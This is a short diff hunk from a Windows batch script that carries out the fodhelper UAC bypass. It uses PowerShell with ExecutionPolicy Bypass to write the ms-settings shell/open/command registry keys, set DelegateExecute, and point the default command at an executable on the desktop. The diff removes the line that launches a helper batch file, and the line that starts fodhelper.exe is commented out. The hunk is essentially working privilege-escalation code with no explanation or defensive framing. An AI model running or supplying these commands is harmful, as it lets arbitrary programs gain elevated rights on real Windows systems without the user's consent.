@@ -6,4 +6,3 @@ powershell.exe -ExecutionPolicy Bypass -Command New-Item "HKCU:\Software\Classes
 powershell.exe -ExecutionPolicy Bypass -Command New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force -Value "123"
 powershell.exe -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value %userprofile%\desktop\123.exe -Name '(Default)'
 :: powershell.exe -ExecutionPolicy Bypass -Command Start-Process "C:\Windows\System32\fodhelper.exe"
-start Start_Fodhelper.bat
